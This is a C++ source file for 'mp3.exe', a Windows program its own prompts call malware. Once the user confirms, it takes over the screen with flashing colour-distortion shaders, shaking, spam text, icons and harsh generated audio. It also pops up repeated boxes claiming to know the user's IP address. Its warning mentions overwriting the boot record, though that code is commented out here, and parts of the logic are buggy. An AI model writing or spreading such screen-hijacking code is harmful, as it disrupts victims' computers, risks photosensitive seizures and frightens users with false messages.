// mp3.cpp : Este arquivo contém as funções "principais". É aqui que começa e termina a execução do programa.
// 

#include <windows.h>
//#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
//#include <time.h>
//#include "sound3.h"
//#include "bootrec.h"
#define M_PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x + y + x + i;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader2(LPVOID lpvd) // Credits to Wooshydudebro (used in River.exe)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	int angle = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

                rgbquad[index].rgbRed = (x*i)&y;
				rgbquad[index].rgbGreen = (x*i)+y;
			}
		}

		i++;
		//StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		int a = 100 * sin(M_PI + angle);
		int b = 10 * cos(M_PI + angle);
		BitBlt(hdc, a, b, w, h, hdcCopy, 0, 0, SRCCOPY);
		angle += 80;
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader3(LPVOID lpvd) //credits to fr4ctalz, but I modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	float colorShift = 400.0;
	float colorIntensity = 0.15;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				int fx = (x ^ y + x + y + x * y);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 1.0f);
				hslcolor.s = fmod(hslcolor.s + (x % 20) / 200.0f, 1.0f);
				hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shaking(LPVOID lpParam)
{
    HDC hdc;
    int sw, sh;
    double angle = 0.0;
    int xadd, yadd; // x angle and y angle
    while (1) {
        hdc = GetDC(NULL);
        sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        xadd = cos(angle) * 10, yadd = sin(angle) * 10;
        BitBlt(hdc, xadd, yadd, sw, sh, hdc, 0, 0, SRCCOPY);
        angle += M_PI / 8;
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}
DWORD WINAPI textout1(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text = "Hi, Venra, is that an windows 7 for Nomenclature.exe on vm?";
		text2 = "It crashed when CPU memory is too low :(";
		text3 = "CPU is too low? Increase your CPU and no crashes.";
		SetTextColor(hdc, Hue(239));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka"); 
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}
VOID WINAPI RotatePoints(POINT* points, int count, POINT center, float angle)
{
	float cosVal = cos(angle);
	float sinVal = sin(angle);
	for (int i = 0; i < count; i++)
	{
		int translatedX = points[i].x - center.x;
		int translatedY = points[i].y - center.y;
		points[i].x = static_cast<int>(translatedX * cosVal - translatedY * sinVal + center.x);
		points[i].y = static_cast<int>(translatedX * sinVal + translatedY * cosVal + center.y);
	}
}
DWORD WINAPI triangles(LPVOID lpParam) //by fr4ctalz
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	float rotationAngle = 0.03f;
	float rotationSpeed = 0.02f;
	while (1)
	{
		HDC hdc = GetDC(0);
		x += incrementor * signX;
		y += incrementor * signY;
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		HBRUSH brush = CreateSolidBrush(Hue(239));
		SelectObject(hdc, brush);
		POINT vertices[] =
		{
			{
				top_x, bottom_y
			},
			{
				bottom_x, bottom_y
			},
			{
				(top_x + bottom_x) / 2, top_y
			}
		};
		POINT center =
		{
			(top_x + bottom_x) / 2, (top_y + bottom_y) / 2
		};
		RotatePoints(vertices, sizeof(vertices) / sizeof(vertices[0]), center, rotationAngle);
		Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}
		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}
		if (y == 0)
		{
			signY = 1;
		}
		if (x == 0)
		{
			signX = 1;
		}
		rotationAngle += rotationSpeed;
		Sleep(1);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shader4(LPVOID lpvd) //credits to fr4ctalz, but I modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;
	float colorShift = 400.0;
	float colorIntensity = 0.15;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
				int fx = (x ^ y + x & y + x + y);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 1.0f);
				hslcolor.s = fmod(hslcolor.s + (x % 20) / 200.0f, 1.0f);
				hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI icons(LPVOID lpParam) //by fr4ctalz
{
	while (1)
	{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		HMODULE hModule = LoadLibrary(TEXT("imageres.dll"));
		int randomIcon = rand() % (250 - 50 + 1) + 50;
		HICON hIcon = LoadIcon(hModule, MAKEINTRESOURCE(randomIcon));
		ICONINFO iconInfo;
		GetIconInfo(hIcon, &iconInfo);
		BITMAP bmpIcon;
		GetObject(iconInfo.hbmColor, sizeof(BITMAP), &bmpIcon);
		int iconWidth = bmpIcon.bmWidth;
		int iconHeight = bmpIcon.bmHeight;
		DrawIconEx(hdc, rand() % x, rand() % y, hIcon, iconWidth * (rand() % 6 + 1), iconHeight * (rand() % 6 + 1), 0, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		Sleep(10);
		FreeLibrary(hModule);
	}
}
DWORD WINAPI last(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb = (rand() % 0x100) * 0x010101;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
VOID WINAPI sound1() { //credits to N17Pro3426, but i modified it and it's 11025 instead of 8000
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		if (t != 0) buffer[t] = static_cast<char>(2 * (t * (t >> 9 | t | t) + (14 & t >> 11)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t >> 3 ^ t >> 19) & t));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * 19) * sin(t >> 2));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t * 12) * tan(t >> 3));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * rand());

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI notepad(LPVOID lpParam)
{
	const CHAR note[] = "Thank you user for trying mp3!"; // VineMEMZ reference
	CreateDirectoryA("C:\\mp3", 0);
	HANDLE hCreateNote = CreateFileW((LPCWSTR)L"C:\\mp3\\note.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hCreateNote != INVALID_HANDLE_VALUE)
	{
		DWORD word;
		if (note == INVALID_HANDLE_VALUE) {
			MessageBoxW(NULL, L"why no VineMemz reference?", L"mp3.exe", MB_ICONERROR); //fallback msgbox
			Sleep(-1);
		}
			ExitProcess(4);
		if (!WriteFile(hCreateNote, note, lstrlenA(note), &word, NULL)) {
			MessageBoxW(NULL, L"Agh! Not again.", L"mp3.exe", MB_ICONERROR); //fallback msgbox
			Sleep(-1);
		}
			ExitProcess(5);
		CloseHandle(hCreateNote);
		ShellExecuteA(NULL, NULL, "notepad", "C:\\mp3\\note.txt", NULL, SW_SHOWDEFAULT);
	}
	return 0;
}
DWORD WINAPI msg(LPVOID lpParam) {
	MessageBox(NULL, L"Your IP is 103.62.155.93", L"Angelo", MB_ICONERROR);
	return 0;
}
DWORD WINAPI MsgSpamThread(LPVOID lpParam) {
	while (1) {
		CreateThread(0, 0, msg, 0, 0, 0);
		Sleep(rand()%30000);
	}
	return 0;
}
DWORD WINAPI fakeerror(LPVOID lpParam) {
	MessageBox(NULL, L"Your IP is 103.62.155.93", L"Error", MB_ICONERROR);
	return 0;
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"This is a Malware, Run?", L"mp3.exe by UnknownException505", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will overwrite the boot record and it contains flashing lights - NOT for epilepsy", L"F?i?n?a?l? ?W?a?r?n?i?n?g? - mp3.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			Sleep(5000);
			CreateThread(0, 0, fakeerror, 0, 0, 0);
			Sleep(3000);
			CreateThread(0, 0, MsgSpamThread, 0, 0, 0);
			Sleep(3000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
		//	HANDLE thread1dot1 = CreateThread(0, 0, programs, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, shaking, 0, 0, 0);
			HANDLE thread3dot2 = CreateThread(0, 0, textout1, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, triangles, 0, 0, 0);
			HANDLE thread4dot2 = CreateThread(0, 0, icons, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
		}
	}
}
